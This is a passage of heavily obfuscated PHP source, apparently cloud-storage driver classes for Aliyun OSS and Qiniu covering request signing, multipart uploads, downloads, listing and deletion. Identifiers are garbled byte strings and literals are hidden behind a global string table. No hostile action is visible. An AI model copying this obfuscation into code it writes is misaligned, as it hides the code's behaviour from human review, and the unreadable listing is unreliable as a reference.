$this->trafficLimit($Ô–¨èÙ«[1532], $ÍñÄ·™˜); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ğ–¢¡Œ), $«­ÌŠ¯ , $ÍñÄ·™˜); } catch (OSS\Core\OssException $îúï™¹Å) { $this->writeLog(__FUNCTION__ . $Ô–¨èÙ«[215] . $îúï™¹Å->getMessage()); return !1; } return $this->getPathOuter($ ­øªï€); } public function getHost() { $›È£Êğ€ =& $_SERVER[åÄ¼Ùßš]; $ÌëÙæ‚í = explode($›È£Êğ€[211], parent::getHost()); return $ÌëÙæ‚í[0] . $›È£Êğ€[211] . $this->bucket . $›È£Êğ€[10] . $ÌëÙæ‚í[1]; } public function uploadFormData($¸Œ¤Š‰, $ØËöùïÖ = 3600) { $€‹Æé÷• =& $_SERVER[åÄ¼Ùßš]; if (!($³²æ… = $this->getHost())) { return !1; } $º¬ä©·½ = $ØËöùïÖ; $Ó«Ï„úŠ = date($€‹Æé÷•[1534], time() + $º¬ä©·½); $Ó€Ğ—‡Õ = new DateTime($Ó«Ï„úŠ); $òÎÇ¾Õ‡ = $Ó€Ğ—‡Õ->format(DateTime::ISO8601); $»œ¦³ = strpos($òÎÇ¾Õ‡, $€‹Æé÷•[373]); $òÎÇ¾Õ‡ = substr($òÎÇ¾Õ‡, 0, $»œ¦³) . $€‹Æé÷•[1535]; $¹¦«Ø£¡ = 1048576000 * 5; $ë×ÊÎ¶¿ = $this->pathFather($¸Œ¤Š‰); $ëó¤¿¬ø = array($€‹Æé÷•[265] => $òÎÇ¾Õ‡, $€‹Æé÷•[268] => array(array($€‹Æé÷•[1536], 0, $¹¦«Ø£¡), array($€‹Æé÷•[270], $€‹Æé÷•[271], $ë×ÊÎ¶¿))); $Ôï»Êø = base64_encode(json_encode($ëó¤¿¬ø)); $¾Öìûš‰ = base64_encode(hash_hmac($€‹Æé÷•[1457], $Ôï»Êø, $this->secret, !0)); $®ó¶‚¾‹ = array($€‹Æé÷•[1537] => $this->accessKey, $€‹Æé÷•[280] => $Ôï»Êø, $€‹Æé÷•[273] => $€‹Æé÷•[264], $€‹Æé÷•[1538] => $¾Öìûš‰, $€‹Æé÷•[209] => $³²æ…); $®ó¶‚¾‹ = $this->trafficLimit($€‹Æé÷•[1532], $®ó¶‚¾‹, !0); return $®ó¶‚¾‹; } public function uploadMultiData($øÒä¤›, $úë®¹åŸ = 3600) { $œÆá˜ã‹ =& $_SERVER[åÄ¼Ùßš]; if (!($âË§Ä“‹ = $this->getHost())) { return !1; } $«–›¿– = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($øÒä¤›)); return array($œÆá˜ã‹[284] => $«–›¿–, $œÆá˜ã‹[209] => $âË§Ä“‹ . $œÆá˜ã‹[8] . $this->pathEncode($øÒä¤›), $œÆá˜ã‹[285] => gmdate($œÆá˜ã‹[1539]), $œÆá˜ã‹[97] => $øÒä¤›); } public function uploadMultiAuth($Ï°ÉıÑä, $Ì¢‹•Ç = array()) { if (isset($Ì¢‹•Ç[$_SERVER[åÄ¼Ùßš][286]])) { return $this->uploadPartAuth($Ï°ÉıÑä, $Ì¢‹•Ç); } return $this->uploadListAuth($Ï°ÉıÑä, $Ì¢‹•Ç); } private function uploadPartAuth($€‡ı¥Ë, $¬ŸÇå¨ = array()) { $õ‘‘‡Í¶ =& $_SERVER[åÄ¼Ùßš]; $úõ×âŸ = $¬ŸÇå¨[$õ‘‘‡Í¶[97]]; $…‰²Ùñ“ = $this->_getUploadAuth($úõ×âŸ, $¬ŸÇå¨); $ïê“üÀ“ = array($õ‘‘‡Í¶[289] => $…‰²Ùñ“[$õ‘‘‡Í¶[289]], $õ‘‘‡Í¶[285] => $…‰²Ùñ“[$õ‘‘‡Í¶[285]]); if (isset($…‰²Ùñ“[$õ‘‘‡Í¶[1540]])) { $ïê“üÀ“[$õ‘‘‡Í¶[1540]] = $…‰²Ùñ“[$õ‘‘‡Í¶[1540]]; } return $ïê“üÀ“; } private function uploadListAuth($¨Ù¯Ë, $êáÀËá’ = array()) { $øòŸÒ¼ =& $_SERVER[åÄ¼Ùßš]; $–‡ÑñÙ = $êáÀËá’[$øòŸÒ¼[97]]; $‚å…Û±¹ = $êáÀËá’[$øòŸÒ¼[284]]; $²Ë§ç´ = $this->client->listParts($this->bucket, $this->pathEncode($–‡ÑñÙ), $‚å…Û±¹); $¯¬Î¾‚Å = $²Ë§ç´->getListPart(); $şáªÖØ³ = array(); foreach ($¯¬Î¾‚Å as $•Êê›Ê™) { $şáªÖØ³[] = array($øòŸÒ¼[300] => $•Êê›Ê™->getPartNumber(), $øòŸÒ¼[301] => trim($•Êê›Ê™->getETag(), $øòŸÒ¼[121])); } if (!$şáªÖØ³) { return !1; } $šœû„çÅ = $this->_getUploadAuth($–‡ÑñÙ, $êáÀËá’); return array($øòŸÒ¼[289] => $šœû„çÅ[$øòŸÒ¼[289]], $øòŸÒ¼[285] => $šœû„çÅ[$øòŸÒ¼[285]], $øòŸÒ¼[292] => $şáªÖØ³); } private function _getUploadAuth($¸ñê§÷, $½‚üËı) { $õÚœèŒ =& $_SERVER[åÄ¼Ùßš]; $ƒ€°ìƒú = gmdate($õÚœèŒ[1539]); $‰‚ùêÙª = isset($½‚üËı[$õÚœèŒ[286]]) ? $õÚœèŒ[256] : $õÚœèŒ[291]; $îâé…€¥ = array_intersect_key($½‚üËı, array_flip(array($õÚœèŒ[286], $õÚœèŒ[284]))); ksort($îâé…€¥); $»™Ä’¥™ = $îâé…€¥ ? $õÚœèŒ[76] . http_build_query($îâé…€¥, null, $õÚœèŒ[287], PHP_QUERY_RFC3986) : $õÚœèŒ[12]; $×âé§ÒĞ = array($‰‚ùêÙª, $õÚœèŒ[12], $õÚœèŒ[123], $ƒ€°ìƒú, "\170\x2d\x6f\x73\163\x2d\x64\x61\164\x65\72{$ƒ€°ìƒú}", $õÚœèŒ[8] . $this->bucket . $õÚœèŒ[8] . $¸ñê§÷ . $»™Ä’¥™); if (isset($½‚üËı[$õÚœèŒ[286]])) { $—‡Ë´åş = $this->trafficLimit($õÚœèŒ[1532], array(), !0); if ($—‡Ë´åş) { $¸ñê§÷ = $õÚœèŒ[1540]; array_splice($×âé§ÒĞ, 5, 0, $¸ñê§÷ . $õÚœèŒ[4] . $—‡Ë´åş[$¸ñê§÷]); } } $Ñšçó = implode($õÚœèŒ[288], $×âé§ÒĞ); $ñá¤¹† = base64_encode(hash_hmac($õÚœèŒ[1457], $Ñšçó, $this->secret, !0)); $ôê³µ±… = $õÚœèŒ[1509] . $this->accessKey . $õÚœèŒ[4] . $ñá¤¹†; $ø³ˆòÊ¤ = array($õÚœèŒ[289] => $ôê³µ±…, $õÚœèŒ[285] => $ƒ€°ìƒú); if (!empty($—‡Ë´åş)) { $ø³ˆòÊ¤ = array_merge($ø³ˆòÊ¤, $—‡Ë´åş); } return $ø³ˆòÊ¤; } public function download($¹ÕÃè³à, $ó™Õâºğ) { $¹°äÖ¼ =& $_SERVER[åÄ¼Ùßš]; if ($this->isFolder($¹ÕÃè³à)) { return !1; } try { $—á×ğÉç = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ó™Õâºğ); $—á×ğÉç = $this->trafficLimit($¹°äÖ¼[112], $—á×ğÉç); $this->client->getObject($this->bucket, $this->pathEncode($¹ÕÃè³à), $—á×ğÉç); } catch (OSS\Core\OssException $¨òØãå) { $this->writeLog(__FUNCTION__ . $¹°äÖ¼[215] . $¨òØãå->getMessage()); return !1; } return $ó™Õâºğ; } public function fileSubstr($éÍö§°, $ÜÙ£Ç·Ü = 0, $ÌäŞò = false) { if ($ÜÙ£Ç·Ü === -1) { $†ãä…‹ë = array(); } else { if ($ÌäŞò === !1) { $Ü¸âÍö™ = $this->size($éÍö§°); } else { $Ü¸âÍö™ = $ÜÙ£Ç·Ü + $ÌäŞò - 1; } $†ãä…‹ë = array(OSS\OssClient::OSS_RANGE => "{$ÜÙ£Ç·Ü}\x2d{$Ü¸âÍö™}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($éÍö§°), $†ãä…‹ë); } catch (OSS\Core\OssException $›Æñ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[åÄ¼Ùßš][215] . $›Æñ‹->getMessage()); think_exception($›Æñ‹->getMessage()); return !1; } } private function trafficLimit($õÜú˜Å, $ã«ê®ò = array(), $‹çÍ–áÖ = false) { $Î²µÌ‚ =& $_SERVER[åÄ¼Ùßš]; if ($õÜú˜Å == $Î²µÌ‚[1532] && $this->isUploadServer() || $õÜú˜Å == $Î²µÌ‚[112] && $this->isFileOutServer()) { return $ã«ê®ò; } $–Á“¦ã¦ = floatval($GLOBALS[$Î²µÌ‚[6]][$Î²µÌ‚[92]][$Î²µÌ‚[110]][$õÜú˜Å]) * 1024 * 1024 * 8; if (!$–Á“¦ã¦) { return $ã«ê®ò; } $–Á“¦ã¦ = $–Á“¦ã¦ < 819200 ? 819200 : ($–Á“¦ã¦ > 838860800 ? 838860800 : $–Á“¦ã¦); if ($‹çÍ–áÖ) { $ã«ê®ò[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–Á“¦ã¦); } else { if (!isset($ã«ê®ò[OSS\OssClient::OSS_HEADERS])) { $ã«ê®ò[OSS\OssClient::OSS_HEADERS] = array(); } $ã«ê®ò[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($–Á“¦ã¦); } return $ã«ê®ò; } public function link($›ê™²ÈŒ, $§ÑÇû¨¹ = array()) { $ñƒí¿õñ =& $_SERVER[åÄ¼Ùßš]; if (!$this->exist($›ê™²ÈŒ) || $this->isFolder($›ê™²ÈŒ)) { return !1; } try { $§ÑÇû¨¹ = $this->trafficLimit($ñƒí¿õñ[112], $§ÑÇû¨¹, !0); $ïÛ×ó—µ = $this->client->signUrl($this->bucket, $this->pathEncode($›ê™²ÈŒ), 3600 * 12, $ñƒí¿õñ[1541], $§ÑÇû¨¹); return $this->getCdnLink($ïÛ×ó—µ); } catch (OSS\Core\OssException $¯úÊóÈş) { $this->writeLog(__FUNCTION__ . $ñƒí¿õñ[215] . $¯úÊóÈş->getMessage()); return !1; } } public function fileOut($Ô«Öªşã, $×îÙø÷ = false, $›‘©ıÏè = false, $Û“Ç·‡È = '') { $ä¾ÍøÀë =& $_SERVER[åÄ¼Ùßš]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ô«Öªşã, $×îÙø÷, $›‘©ıÏè, $Û“Ç·‡È); } if (!$›‘©ıÏè) { $›‘©ıÏè = $this->pathThis($Ô«Öªşã); } $›‘©ıÏè = rawurlencode($›‘©ıÏè); $´éé ¯… = get_file_mime(get_path_ext($›‘©ıÏè)); if ($´éé ¯… == $ä¾ÍøÀë[251]) { return parent::fileOut($Ô«Öªşã, $×îÙø÷, $›‘©ıÏè, $Û“Ç·‡È); } $×îÙø÷ = $×îÙø÷ ? $ä¾ÍøÀë[1542] : $ä¾ÍøÀë[1543]; $àôŞ¬õ¾ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ä¾ÍøÀë[1544] . rawurlencode("{$×îÙø÷}\73\146\151\x6c\145\156\141\x6d\x65\x3d{$›‘©ıÏè}")); $ÁƒæÜÃ = $this->link($Ô«Öªşã, $àôŞ¬õ¾); $this->fileOutLink($ÁƒæÜÃ); } public function fileOutServer($Ÿè’Ä¢, $ãÜªµÀ˜ = false, $Ñ¾ŞÇ = false, $¾œçÃ¸¡ = '') { parent::fileOut($Ÿè’Ä¢, $ãÜªµÀ˜, $Ñ¾ŞÇ, $¾œçÃ¸¡); } public function fileOutImage($ª‘‚ŒĞé, $åå‚êò÷ = 250) { if ($this->size($ª‘‚ŒĞé) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ª‘‚ŒĞé, $åå‚êò÷); } $§Íš©ùá = array(OSS\OssClient::OSS_PROCESS => $_SERVER[åÄ¼Ùßš][1506] . $åå‚êò÷); $½£¿üòŸ = $this->link($ª‘‚ŒĞé, $§Íš©ùá); $this->fileOutLink($½£¿üòŸ); } public function fileOutImageServer($„ÆşşõÅ, $†±å°…Î = 250) { parent::fileOutImage($„ÆşşõÅ, $†±å°…Î); } public function fileOutLink($ÀéÒ£¡Î) { $æÑìùğ =& $_SERVER[åÄ¼Ùßš]; if (!$this->isCdnHost() && substr($ÀéÒ£¡Î, 0, 7) == $æÑìùğ[219]) { $ÀéÒ£¡Î = $æÑìùğ[220] . substr($ÀéÒ£¡Î, 7); } header($æÑìùğ[175] . $ÀéÒ£¡Î); die; } public function hashMd5($£¬øÏ£, $Æ½Ù†Ñë = '') { $•ö–Ş™ =& $_SERVER[åÄ¼Ùßš]; $ÏÙù€ú© = $this->_objectMeta($£¬øÏ£); if (!$ÏÙù€ú©) { return $•ö–Ş™[12]; } if (!isset($ÏÙù€ú©[$•ö–Ş™[1526]]) && !empty($Æ½Ù†Ñë)) { $ĞÈëÒ×« = $this->updateObjMeta($£¬øÏ£, array($•ö–Ş™[1526] => $Æ½Ù†Ñë)); $ÏÙù€ú©[$•ö–Ş™[1526]] = $ĞÈëÒ×« ? $Æ½Ù†Ñë : $•ö–Ş™[12]; } return isset($ÏÙù€ú©[$•ö–Ş™[1526]]) ? strtolower($ÏÙù€ú©[$•ö–Ş™[1526]]) : $•ö–Ş™[12]; } public function size($ÏÀá‹») { $İ˜ôÚ = $this->objectMeta($ÏÀá‹»); return $İ˜ôÚ ? $İ˜ôÚ[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function info($Â”Ï°Œø) { if ($this->isFolder($Â”Ï°Œø)) { return $this->folderInfo($Â”Ï°Œø); } else { if ($this->isFile($Â”Ï°Œø)) { return $this->fileInfo($Â”Ï°Œø); } } return !1; } public function exist($Ï¹¦õ©î) { return $this->isFile($Ï¹¦õ©î) || $this->isFolder($Ï¹¦õ©î); } public function isFile($÷à¬¼Ìá) { return !$this->isFolder($÷à¬¼Ìá) && $this->objectMeta($÷à¬¼Ìá); } public function isFolder($¢À¢Â‡) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][180], $¢À¢Â‡); } protected function objectMeta($üüá¼Á©) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][182], $üüá¼Á©); } protected function _objectMeta($¨À½ÎËú) { $Éôª‘æœ =& $_SERVER[åÄ¼Ùßš]; try { $Ğ±ıŞ­Š = $this->client->getObjectMeta($this->bucket, $this->pathEncode($¨À½ÎËú)); } catch (OSS\Core\OssException $»¶”áÃÒ) { $this->writeLog(__FUNCTION__ . $Éôª‘æœ[215] . $»¶”áÃÒ->getMessage()); $Ğ±ıŞ­Š = !1; } if ($Ğ±ıŞ­Š) { $Ğ±ıŞ­Š[$Éôª‘æœ[79]] = intval($Ğ±ıŞ­Š[$Éôª‘æœ[1524]]); } return $Ğ±ıŞ­Š; } protected function _isFolder($ÊĞüÕ‘Ó) { $¢ó‰‰îŠ =& $_SERVER[åÄ¼Ùßš]; if ($ÊĞüÕ‘Ó == $¢ó‰‰îŠ[12] || $ÊĞüÕ‘Ó == $¢ó‰‰îŠ[8]) { return !0; } $Äö„» = array($¢ó‰‰îŠ[1519] => $¢ó‰‰îŠ[8], $¢ó‰‰îŠ[1520] => rtrim($ÊĞüÕ‘Ó, $¢ó‰‰îŠ[8]) . $¢ó‰‰îŠ[8], $¢ó‰‰îŠ[1521] => 1, $¢ó‰‰îŠ[1522] => $¢ó‰‰îŠ[12]); $€¬ÓŠ‚¯ = $this->client->listObjects($this->bucket, $Äö„»); if ($€¬ÓŠ‚¯->getObjectList() || $€¬ÓŠ‚¯->getPrefixList()) { return !0; } return !1; } public function writeLog($‚Ê‰ƒ“­ = '', $¾Şº›œŒ = false) { $Àšñí’ =& $_SERVER[åÄ¼Ùßš]; $½ßŒØ°Ò = in_array(ACTION, array($Àšñí’[213], $Àšñí’[214])); if (!$½ßŒØ°Ò && !GLOBAL_DEBUG) { return; } $ìÈ‡Ø = 0; if (stripos($‚Ê‰ƒ“­, $Àšñí’[1545]) !== !1) { $ìÈ‡Ø = 1; $œâóğŞø = explode($Àšñí’[1546], $‚Ê‰ƒ“­); $‚Ê‰ƒ“­ = !empty($œâóğŞø[1]) ? $œâóğŞø[1] : $‚Ê‰ƒ“­; } else { if (stripos($‚Ê‰ƒ“­, $Àšñí’[1547])) { $ìÈ‡Ø = 2; $œâóğŞø = explode($Àšñí’[1547], $‚Ê‰ƒ“­); $œâóğŞø = explode($Àšñí’[4], $œâóğŞø[0]); $‚Ê‰ƒ“­ = !empty($œâóğŞø[1]) ? $œâóğŞø[1] : $‚Ê‰ƒ“­; } } if ($½ßŒØ°Ò && I18n::getType() == $Àšñí’[1548]) { if ($ìÈ‡Ø == 1) { $‚Ê‰ƒ“­ = str_replace($Àšñí’[1549], $Àšñí’[1550], $‚Ê‰ƒ“­); } else { if ($ìÈ‡Ø == 2) { $œâóğŞø = explode($Àšñí’[215], $œâóğŞø[0]); $ÏÇÓ”º = isset($œâóğŞø[1]) ? $œâóğŞø[1] : $Àšñí’[12]; $”¬†µüÔ = array($Àšñí’[1551] => $Àšñí’[1552], $Àšñí’[1553] => $Àšñí’[1554], $Àšñí’[1555] => $Àšñí’[1556], $Àšñí’[1557] => $Àšñí’[1558], $Àšñí’[1559] => $Àšñí’[1560], $Àšñí’[1561] => $Àšñí’[1562], $Àšñí’[1563] => $Àšñí’[1564], $Àšñí’[1565] => $Àšñí’[1566], $Àšñí’[1567] => $Àšñí’[1568], $Àšñí’[1569] => $Àšñí’[1570]); if (isset($”¬†µüÔ[$ÏÇÓ”º])) { $‚Ê‰ƒ“­ = $”¬†µüÔ[$ÏÇÓ”º]; } } } if (stripos($‚Ê‰ƒ“­, $Àšñí’[1571])) { $‚Ê‰ƒ“­ = $Àšñí’[1572]; } } if (!trim($‚Ê‰ƒ“­)) { return; } parent::writeLog(trim($‚Ê‰ƒ“­), $¾Şº›œŒ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($½ªÎ®¯£) { parent::__construct(); require_once SDK_DIR . $_SERVER[åÄ¼Ùßš][1573]; $this->_init($½ªÎ®¯£); } public function _init($ëæÄ‡Ñ) { $¼áÕ…¾Î =& $_SERVER[åÄ¼Ùßš]; $this->config = $ëæÄ‡Ñ; foreach ($ëæÄ‡Ñ as $ÌÒßÉÍØ => $ŠØÈ³–¤) { if (isset($this->{$ÌÒßÉÍØ})) { $this->{$ÌÒßÉÍØ} = $ŠØÈ³–¤; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¼áÕ…¾Î[1574] . LNG($¼áÕ…¾Î[1510])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‹±šóîø, $¥‰ ‡ºä = '', $ÑŒ°ÎÓ± = REPEAT_RENAME) { if ($this->setContent($‹±šóîø, $¥‰ ‡ºä)) { return $this->getPathOuter($‹±šóîø); } return !1; } public function mkdir($² ¸´Ü…, $¨ÒúòõË = REPEAT_SKIP) { $ÇÂŒµºİ =& $_SERVER[åÄ¼Ùßš]; $òÂğëì = trim($² ¸´Ü…, $ÇÂŒµºİ[8]); if ($this->_isFolder($òÂğëì)) { return $this->getPathOuter($òÂğëì); } $² ¸´Ü… = $òÂğëì . $ÇÂŒµºİ[8]; $øöˆØ¸­ = get_path_this($òÂğëì); $ÜØÃƒÀ‘ = $² ¸´Ü… . $øöˆØ¸­; if (!$this->mkfile($ÜØÃƒÀ‘)) { return !1; } if (!$this->moveFile($ÜØÃƒÀ‘, $² ¸´Ü…)) { $this->delFile($ÜØÃƒÀ‘); return !1; } return $this->getPathOuter($òÂğëì); } public function copyFile($óœÊÔ¯, $˜½Æ–Å) { $ ´ ×â = $this->bucketManager->copy($this->bucket, $óœÊÔ¯, $this->bucket, $˜½Æ–Å, !0); return $ ´ ×â ? !1 : $this->getPathOuter($˜½Æ–Å); } public function moveFile($à‡Œ²ªÆ, $‚ë®³’È) { $™—ıÜò = $this->bucketManager->move($this->bucket, $à‡Œ²ªÆ, $this->bucket, $‚ë®³’È, !0); return $™—ıÜò ? !1 : $this->getPathOuter($‚ë®³’È); } public function delFile($½ƒ‹ä İ) { if (!$this->exist($½ƒ‹ä İ)) { return !0; } $ÕÚàŒûı = $this->bucketManager->delete($this->bucket, $½ƒ‹ä İ); if (!$ÕÚàŒûı) { return !0; } return $ÕÚàŒûı->code() == 612 ? !0 : !1; } public function delFolder($×•°²İ) { $µ†”úÊ¯ =& $_SERVER[åÄ¼Ùßš]; if (!$this->exist($×•°²İ)) { return !0; } $this->listItemCache = !1; $²˜ÈÓ°Ï = $this->fileList($×•°²İ); $this->listItemCache = !0; $­æ»…³Æ = trim($×•°²İ, $µ†”úÊ¯[8]) . $µ†”úÊ¯[8]; if (!empty($×•°²İ) && $×•°²İ !== $µ†”úÊ¯[231] && !in_array($­æ»…³Æ, $²˜ÈÓ°Ï[$µ†”úÊ¯[85]])) { $²˜ÈÓ°Ï[$µ†”úÊ¯[85]][] = $­æ»…³Æ; } $İ´¨ÆÓû = $this->delByBatch($²˜ÈÓ°Ï[$µ†”úÊ¯[86]]); if (!$İ´¨ÆÓû) { return !1; } $İ´¨ÆÓû = $this->delByBatch($²˜ÈÓ°Ï[$µ†”úÊ¯[85]]); if (!$İ´¨ÆÓû) { return !1; } return $this->delFile($­æ»…³Æ); } private function delByBatch($Ù­©Å–) { foreach (array_chunk($Ù­©Å–, 1000) as $¹¤ÊÈıƒ) { $¶§É±Ë¿ = $this->bucketManager->buildBatchDelete($this->bucket, $¹¤ÊÈıƒ); list($ıõ’åœ³, $‹¢—©ã) = $this->bucketManager->batch($¶§É±Ë¿); if ($‹¢—©ã) { return !1; } } return !0; } public function rename($˜åá™²ú, $èÓ¬·šÊ) { return $this->renameObject($˜åá™²ú, $èÓ¬·šÊ); } public function fileInfo($¸õÛÔ, $Ÿù•ûº = false, $Êïü¿ÏÑ = array()) { $¡úçÛÚô =& $_SERVER[åÄ¼Ùßš]; $À²ôË‡« = array($¡úçÛÚô[32] => $this->pathThis($¸õÛÔ), $¡úçÛÚô[87] => $this->getPathOuter($¡úçÛÚô[8] . $¸õÛÔ), $¡úçÛÚô[33] => $¡úçÛÚô[233], $¡úçÛÚô[79] => isset($Êïü¿ÏÑ[$¡úçÛÚô[1575]]) ? $Êïü¿ÏÑ[$¡úçÛÚô[1575]] : 0, $¡úçÛÚô[169] => $this->ext($¸õÛÔ)); if ($Ÿù•ûº) { return $À²ôË‡«; } $À²ôË‡«[$¡úçÛÚô[234]] = $À²ôË‡«[$¡úçÛÚô[88]] = 0; $À²ôË‡«[$¡úçÛÚô[235]] = $À²ôË‡«[$¡úçÛÚô[236]] = !0; if (empty($Êïü¿ÏÑ)) { $Êïü¿ÏÑ = $this->objectMeta($¸õÛÔ); if (!$Êïü¿ÏÑ) { return $À²ôË‡«; } } if (isset($Êïü¿ÏÑ[$¡úçÛÚô[237]]) && $Êïü¿ÏÑ[$¡úçÛÚô[237]]) { $À²ôË‡«[$¡úçÛÚô[238]] = $Êïü¿ÏÑ[$¡úçÛÚô[237]]; } if (isset($Êïü¿ÏÑ[$¡úçÛÚô[248]]) && $Êïü¿ÏÑ[$¡úçÛÚô[248]]) { $À²ôË‡«[$¡úçÛÚô[238]] = $Êïü¿ÏÑ[$¡úçÛÚô[248]]; } if (isset($Êïü¿ÏÑ[$¡úçÛÚô[1576]])) { $À²ôË‡«[$¡úçÛÚô[88]] = substr($Êïü¿ÏÑ[$¡úçÛÚô[1576]] . $¡úçÛÚô[12], 0, 10); } if (isset($Êïü¿ÏÑ[$¡úçÛÚô[1575]])) { $À²ôË‡«[$¡úçÛÚô[79]] = $Êïü¿ÏÑ[$¡úçÛÚô[1575]]; } return $À²ôË‡«; } public function folderInfo($ÈÏß›¡Ï, $½üöÖÈç = false) { $à®ßó­ =& $_SERVER[åÄ¼Ùßš]; $Üé¢è‡ş = array($à®ßó­[32] => $this->pathThis($ÈÏß›¡Ï), $à®ßó­[87] => $this->getPathOuter($à®ßó­[8] . $ÈÏß›¡Ï), $à®ßó­[33] => $à®ßó­[78]); if ($½üöÖÈç) { return $Üé¢è‡ş; } $Üé¢è‡ş[$à®ßó­[234]] = $Üé¢è‡ş[$à®ßó­[88]] = 0; $Üé¢è‡ş[$à®ßó­[235]] = $Üé¢è‡ş[$à®ßó­[236]] = !0; $ÈÏß›¡Ï = rtrim($ÈÏß›¡Ï, $à®ßó­[8]) . $à®ßó­[8]; $¸®¹ñåù = $this->objectMeta($ÈÏß›¡Ï); if (isset($¸®¹ñåù[$à®ßó­[1576]])) { $Üé¢è‡ş[$à®ßó­[88]] = substr($¸®¹ñåù[$à®ßó­[1576]] . $à®ßó­[12], 0, 10); } return $Üé¢è‡ş; } public function listPath($ñ¹è»Æ…, $ÛœÂ½ß = false) { $Ÿû¯ú•ú =& $_SERVER[åÄ¼Ùßš]; $¦çşËÉÅ = $this->fileList($ñ¹è»Æ…, $Ÿû¯ú•ú[8], !0); foreach ($¦çşËÉÅ[$Ÿû¯ú•ú[85]] as $¼İş‘›ï => $“çöğ”æ) { $¦çşËÉÅ[$Ÿû¯ú•ú[85]][$¼İş‘›ï] = $this->folderInfo($“çöğ”æ, $ÛœÂ½ß); } foreach ($¦çşËÉÅ[$Ÿû¯ú•ú[86]] as $¼İş‘›ï => $“çöğ”æ) { $¦çşËÉÅ[$Ÿû¯ú•ú[86]][$¼İş‘›ï] = $this->fileInfo($“çöğ”æ[$Ÿû¯ú•ú[32]], $ÛœÂ½ß, $“çöğ”æ); } return $¦çşËÉÅ; } public function has($È›Áù¯†, $Ñò¡½åé = false, $İîÇ×Ó = true) { $…ğ¸ÂÀ· =& $_SERVER[åÄ¼Ùßš]; $È›Áù¯† = trim($È›Áù¯†, $…ğ¸ÂÀ·[8]); $îÊ„Æ–Å = empty($È›Áù¯†) && $È›Áù¯† !== $…ğ¸ÂÀ·[231] ? $…ğ¸ÂÀ·[12] : $È›Áù¯† . $…ğ¸ÂÀ·[8]; $ĞÏ¬Ç« = $…ğ¸ÂÀ·[12]; $¹»ÛçƒÌ = 500; $ñ”–”§Ô = $…ğ¸ÂÀ·[8]; $õŸº±§  = $³¡–ª” = 0; while (!0) { check_abort(); list($Ğ­ÁÈİ¬, $”°‡Ş¨ê) = $this->bucketManager->listFiles($this->bucket, $îÊ„Æ–Å, $ĞÏ¬Ç«, $¹»ÛçƒÌ, $ñ”–”§Ô); if ($”°‡Ş¨ê) { break; } $ĞÏ¬Ç« = array_key_exists($…ğ¸ÂÀ·[1522], $Ğ­ÁÈİ¬) ? $ĞÏ¬Ç« = $Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1577]] : $…ğ¸ÂÀ·[12]; if ($Ñò¡½åé) { if (!empty($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1578]])) { $õŸº±§  += count($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1578]]); } if (!empty($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1579]])) { $³¡–ª” += count($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1579]]); } if ($ĞÏ¬Ç« === $…ğ¸ÂÀ·[12]) { break; } continue; } if ($İîÇ×Ó) { if (!empty($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1578]])) { return !0; } } else { if (!empty($Ğ­ÁÈİ¬[$…ğ¸ÂÀ·[1579]])) { return !0; } } if ($ĞÏ¬Ç« === $…ğ¸ÂÀ·[12]) { break; } } if ($Ñò¡½åé) { return array($…ğ¸ÂÀ·[242] => $õŸº±§ , $…ğ¸ÂÀ·[243] => $³¡–ª”); } return !1; } public function listAll($ƒ†¢³Çñ) { $ã÷ÌõŠ =& $_SERVER[åÄ¼Ùßš]; $šàÆÉ§ˆ = $this->fileList($ƒ†¢³Çñ, $ã÷ÌõŠ[12], !0); $Ä«Ë€ô = array_to_keyvalue($šàÆÉ§ˆ[$ã÷ÌõŠ[86]], $ã÷ÌõŠ[32]); foreach ($šàÆÉ§ˆ[$ã÷ÌõŠ[85]] as $¨†ÌØ˜“) { if (is_string($¨†ÌØ˜“)) { $Ä«Ë€ô[$¨†ÌØ˜“] = array($ã÷ÌõŠ[79] => 0); } } return $this->listAllFiles($ƒ†¢³Çñ, $Ä«Ë€ô); } private function fileList($ã§²ßúº, $¶éŒ® = '', $µ¾ëÇ©» = 0) { $Œ› ‹¾ö =& $_SERVER[åÄ¼Ùßš]; $ã§²ßúº = trim($ã§²ßúº, $Œ› ‹¾ö[8]); $ğ¡ÒŠğÈ = empty($ã§²ßúº) && $ã§²ßúº !== $Œ› ‹¾ö[231] ? $Œ› ‹¾ö[12] : $ã§²ßúº . $Œ› ‹¾ö[8]; $ùëË§Í‚ = $Œ› ‹¾ö[12]; $ÒŒôù¼ = 1000; $¦¼øÜæµ = $“î€ã¨Ğ = array(); while (!0) { check_abort(); list($ïîÍıĞ, $úãÓËùµ) = $this->bucketManager->listFiles($this->bucket, $ğ¡ÒŠğÈ, $ùëË§Í‚, $ÒŒôù¼, $¶éŒ®); if ($úãÓËùµ) { break; } $ùëË§Í‚ = array_key_exists($Œ› ‹¾ö[1522], $ïîÍıĞ) ? $ùëË§Í‚ = $ïîÍıĞ[$Œ› ‹¾ö[1577]] : $Œ› ‹¾ö[12]; $Û‰×…‡¥ = 